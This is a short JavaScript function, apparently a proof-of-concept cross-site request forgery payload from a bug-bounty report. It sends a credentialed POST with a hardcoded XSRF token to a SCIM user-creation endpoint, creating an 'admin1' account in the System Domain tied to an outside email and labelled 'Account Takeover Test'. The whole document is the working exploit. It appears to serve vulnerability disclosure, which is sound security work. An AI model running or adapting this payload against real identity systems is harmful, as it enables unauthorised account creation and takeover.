function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/bbt16.workspacetest.com\/SAAS\/jersey\/manager\/api\/scim\/Users?locale=en", true);
        xhr.setRequestHeader("accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
        xhr.setRequestHeader("content-type", "application\/json");
				xhr.setRequestHeader("X-Xsrf-Token", "e53dc3796ef4df6");

        xhr.withCredentials = true;
        var body = "{\"urn:scim:schemas:core:1.0\":{\"userName\":\"admin1\"},\"urn:scim:schemas:extension:enterprise:1.0\":{},\"urn:scim:schemas:extension:workspace:1.0\":{\"domain\":\"System Domain\"},\"urn:scim:schemas:extension:workspace:mfa:1.0\":{},\"schemas\":[\"urn:scim:schemas:core:1.0\",\"urn:scim:schemas:extension:enterprise:1.0\",\"urn:scim:schemas:extension:workspace:1.0\",\"urn:scim:schemas:extension:workspace:mfa:1.0\"],\"emails\":[{\"value\":\"moblig+01@wearehackerone.com\"}],\"userName\":\"admin1\",\"name\":{\"givenName\":\"Account Takeover Test\",\"familyName\":\"Test\"}}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
